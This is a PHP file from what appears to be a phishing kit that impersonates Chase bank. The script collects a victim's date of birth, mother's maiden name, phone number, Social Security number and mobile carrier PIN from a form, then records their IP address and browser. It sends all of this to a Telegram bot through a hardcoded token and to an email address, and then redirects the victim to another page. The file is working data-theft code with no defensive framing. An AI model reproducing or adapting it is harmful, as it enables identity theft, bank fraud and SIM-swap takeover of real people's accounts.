<?php

function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

session_start();

// Check if 'logId' session variable is set


if (isset($_POST['dob'])) {
    include 'to.php';

    $dob = $_POST['dob'];
    $mmn = $_POST['mmn'];
    $phn = $_POST['phn'];
    $ssn = $_POST['ssn'];
    $pin = $_POST['input_541'];

    $ip = getClientIP();

    $message =  "<b>💳 CHASE Personal Info💳</b>\n";
    $message .= "<b>🎈User:</b> <code>{$_SESSION['email']}</code>\n"; // Assuming you have stored email in session previously
    $message .= "<b>♠Date Of Brith:</b> <code>$dob</code>\n";
    $message .= "<b>💍Mother Maiden Name:</b> <code>$mmn</code>\n";
    $message .= "<b>📱Phone:</b> <code>$phn</code>\n";
    $message .= "<b>💎SSN:</b> <code>$ssn</code>\n";
    $message .= "<b>📱Carrier-PIN:</b> <code>$pin</code>\n";
    $message .= "<b>🌐 IP Address:</b>$ip\n";
    $message .= "<b>⌚ Time:</b> " . date("Y-m-d H:i:s") . "\n";
    $message .= "<b>🖥 User-Agent:</b>{$_SERVER['HTTP_USER_AGENT']}\n";
    $message .= "<b>🔍 CHASE SSN BY BESHO MANDO💳</b> \n";

    
    // Email subject and headers
    $subject = "CHASE SSN";
    $headers = "From: Mody@CHASE" . rand(1, 99) . "Mody.V1 \r\n";

    // Send message to Telegram
    file_get_contents("https://api.telegram.org/bot6024595519:AAHQcscrgYlrL2vxuh_mXG4FHKugXRA4Rww/sendMessage?chat_id=" . $chatid . "&parse_mode=HTML&text=" . urlencode($message));

    // Send email
    $done = mail($toemail, $subject, $message, $headers);

    header('Location: ./red8.php');
}

?>
